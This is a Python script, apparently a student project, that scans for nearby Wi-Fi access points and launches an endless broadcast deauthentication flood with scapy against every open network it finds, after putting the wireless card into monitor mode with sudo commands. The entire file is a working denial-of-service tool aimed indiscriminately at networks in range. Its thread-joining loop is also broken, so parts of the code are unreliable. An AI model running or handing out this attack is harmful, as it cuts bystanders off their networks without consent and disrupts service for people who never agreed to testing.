from ntpath import join
import subprocess
import re
import os
from multiprocessing import process
from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp        # for sending packets
)
from threading import Thread

"""

+---------------------------------------+
+ Done by :                             +
+          - Abdelrahman Ajawi 131998   +
+          - Ayham Alhami  134736       +
+                                       +
+ Instructor : Mohammed Alshourman      +
+---------------------------------------+

"""



def DOSAttack(MACAddressAccessPoint , interfaceName , channel):
    # broadcast to all devices that connext to this access point
    target_mac_adress = 'ff:ff:ff:ff:ff:ff'
    mode_monitor_on(interfaceName,channel)
    while True:
     dot1  = Dot11(addr1=target_mac_adress, addr2=MACAddressAccessPoint, addr3=MACAddressAccessPoint)
     frame = RadioTap()/dot1/Dot11Deauth()
     sendp(frame, iface=interfaceName, count=10)

# set interface to moniter mode 
def mode_monitor_on(interfaceName,channel):
   if os.system('sudo service NetworkManager stop') !=  0 :
    print('sudo service NetworkManager stop . command not work!')
   if os.system('sudo ifconfig '+interfaceName+' down') !=  0 :
        print('sudo ifconfig '+interfaceName+' down . command not work!')
   changeChannelToAceessPointChannal(interfaceName,channel)
   if  os.system('sudo iwconfig '+interfaceName+' mode monitor') : 
       print('sudo iwconfig '+interfaceName+' mode monitor .  command not work!')
   if os.system('sudo ifconfig '+interfaceName+' up') : 
       print('sudo ifconfig '+interfaceName+' up not .  command work!')

# set interface channle to ap channel  
def changeChannelToAceessPointChannal(interfaceName,channel):
   if os.system('sudo iwconfig '+interfaceName +' channel '+str(channel)) : 
       print('sudo iwconfig '+interfaceName +' channel '+str(channel) +'. not work')
   print('channel changed')
# get the name of interface
def getInterfaceName ():
    interface  = subprocess.check_output("sudo iwconfig", shell=True)
    interface = re.findall(r'\w+\s+IEEE 802.11',str(interface))
    interface = interface[0].replace("IEEE 802.11","")
    interface = interface.replace(" ","") 
    return interface
# get access points information  
def getAccessPointsInformation(interfaceName):
    return subprocess.run(["sudo", "iwlist",interfaceName,"scan"],capture_output=True, text=True).stdout
# get list of mac address
def getMACAddressAccessPointList(accessPointsInformation):
    return re.findall(r'[0-9a-zA-Z]{2}:[0-9a-zA-Z]{2}:[0-9a-zA-Z]{2}:[0-9a-zA-Z]{2}:[0-9a-zA-Z]{2}:[0-9a-zA-Z]{2}',accessPointsInformation)
# get list of Encryption key List 
def getEncryptionkeyList(accessPointsInformation):
    encryptionkeyList  = re.findall(r'Encryption key:(?:off|on)',accessPointsInformation)
    for index in range(len(encryptionkeyList)):
        encryptionkeyList[index] = encryptionkeyList[index].replace("Encryption key:","")
    return encryptionkeyList
# get access points Channel List 
def getChannelList(accessPointsInformation):
    channelList = re.findall(r'Channel \d+',accessPointsInformation)
    for index in range(len(channelList)):
        channelList[index] = int(channelList[index].replace("Channel ",""))
    return channelList
# change interface to managed mode in the beginning 
def networkReady():
   interfaceName = getInterfaceName()
   if os.system('sudo ifconfig '+interfaceName+' down') !=  0 :
       print('sudo ifconfig '+interfaceName+' down . command not work!')
   if  os.system('sudo iwconfig '+interfaceName+' mode managed') : 
       print('sudo iwconfig '+interfaceName+' mode managed .  command not work!')
   if os.system('sudo ifconfig '+interfaceName+' up') : 
       print('sudo ifconfig '+interfaceName+' up  .  command not work!')
   print("ready")

networkReady()

interfaceName = getInterfaceName()

accessPointsInformation = getAccessPointsInformation(interfaceName)

MACAddressAccessPointList = getMACAddressAccessPointList(accessPointsInformation)

EncryptionkeyList = getEncryptionkeyList(accessPointsInformation)

channelList = getChannelList(accessPointsInformation)

      
print(MACAddressAccessPointList)
print(EncryptionkeyList)
print(channelList)
print(interfaceName)

threads = []
for index in range(len(EncryptionkeyList)) : 
    if(EncryptionkeyList[index] == "off") :
        print("found open wifi")
        thread = Thread(target=DOSAttack , args=(MACAddressAccessPointList[index],interfaceName,channelList[index]))  
        threads.append(threads)
        thread.start()
for t in range(len(threads)) : 
  t.join()
  
    # DOSAttack(MACAddressAccessPointList[index],interfaceName,channelList[index])

